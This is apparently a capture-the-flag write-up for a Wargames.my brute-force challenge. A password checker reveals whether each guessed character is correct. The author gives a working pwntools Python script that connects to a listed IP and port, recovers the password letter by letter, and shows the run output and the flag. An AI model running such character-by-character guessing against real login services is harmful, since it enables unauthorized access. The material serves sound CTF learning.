---
title: "Wargames.my 2015 - Foo Soo Rah (Brute)"
tags:
  - wargamesmy2016
  - writeup
  - programming
  - bruteforce
---

We are given an IP address:port pair and told to bruteforce smartly.

On connecting, we are asked for a password. It tells us whether the password
fails and returns the response time of the password check. The vulnerability
here is that when the letter matches, no further data is sent. So we can simply
bruteforce by iterating letter by letter until we receive a success message.

```python
from pwn import *
import string

HOST = "107.191.103.43"
PORT = 1234

def main():
    charset = string.ascii_lowercase
    password = ""
    while True:
        for i in charset:
            result = get_response(password + i)
            if result == "succeed":
                password += i
                log.success("Found your key! It is: %s" % password)
                return
            elif result == "onemore":
                password += i
                log.success("Got next character '%s' (%s)" % (i, password))

def get_response(data):
    conn = remote(HOST, PORT)
    conn.sendline(data)
    failpass = ""
    try:
        failpass = conn.recvline_contains(("Failed!", "SUCCEEDED"))
    except:
        pass
    conn.close()
    if "Failed!" in failpass:
        return "fail"
    elif "SUCCEEDED" in failpass:
        return "succeed"
    else:
        return "onemore"

if __name__ == "__main__":
    main()
```

Here is it in action:

```shell
$ python exploit.py
[+] Got next character 't' (t)
[+] Opening connection to 107.191.103.43 on port 1234: Done
[*] Closed connection to 107.191.103.43 port 1234
... SNIP ...
[+] Opening connection to 107.191.103.43 on port 1234: Done
[*] Closed connection to 107.191.103.43 port 1234
[+] Got next character 'e' (thereisnoke)
[+] Opening connection to 107.191.103.43 on port 1234: Done
[*] Closed connection to 107.191.103.43 port 1234
... SNIP ...
[+] Opening connection to 107.191.103.43 on port 1234: Done
[*] Closed connection to 107.191.103.43 port 1234
[+] Found your key! It is: thereisnokey
```

Flag: **thereisnokey**
